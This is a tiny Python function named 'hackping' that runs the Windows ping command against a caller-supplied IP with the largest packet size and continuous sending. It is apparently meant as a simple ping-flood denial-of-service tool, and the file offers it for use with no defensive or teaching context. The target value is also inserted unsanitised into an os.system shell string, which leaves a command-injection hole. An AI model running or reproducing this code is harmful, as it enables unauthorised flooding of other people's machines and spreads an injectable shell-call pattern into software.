def hackping(targetIP:str):
	"""python_version:>=3.6"""
	from os import system
	from gc import collect
	system("ping -a -l 65500 -i 255 %s -t"%(targetIP))
	collect()
